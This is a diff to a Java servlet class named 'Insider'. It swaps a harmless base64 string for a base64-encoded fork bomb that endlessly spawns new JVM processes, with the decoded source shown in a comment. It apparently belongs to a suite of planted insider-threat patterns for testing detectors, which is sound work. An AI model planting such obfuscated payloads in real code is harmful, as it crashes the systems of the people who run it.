@@ -50,21 +50,21 @@ public class Insider extends HttpServlet {
       getConnection();
 
 
-
         // decoded version of source is -
         /*
-         "package test;
-          public class Test {
-             static {
-                  System.out.println(\"hello\");
-             }
-             public Test() {
-                System.out.println(\"world\");
-             }
-          }"
+         public class ForkBomb
+         {
+            public static void main(String[] args)
+            {
+              while(true)
+              {
+                Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
+              }
+            }
+          }
         */
 
-      String source = "cGFja2FnZSB0ZXN0OyBwdWJsaWMgY2xhc3MgVGVzdCB7IHN0YXRpYyB7IFN5c3RlbS5vdXQucHJpbnRsbigiaGVsbG8iKTsgfSBwdWJsaWMgVGVzdCgpIHsgU3lzdGVtLm91dC5wcmludGxuKCJ3b3JsZCIpOyB9IH0=";
+      String source = "cHVibGljIGNsYXNzIEZvcmtCb21iIHsgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nW10gYXJncykgeyB3aGlsZSh0cnVlKSB7IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMobmV3IFN0cmluZ1tdeyJqYXZhdyIsICItY3AiLCBTeXN0ZW0uZ2V0UHJvcGVydHkoImphdmEuY2xhc3MucGF0aCIpLCAiRm9ya0JvbWIifSk7IH0gfSB9";
 
 
       // RECIPE: Time Bomb pattern
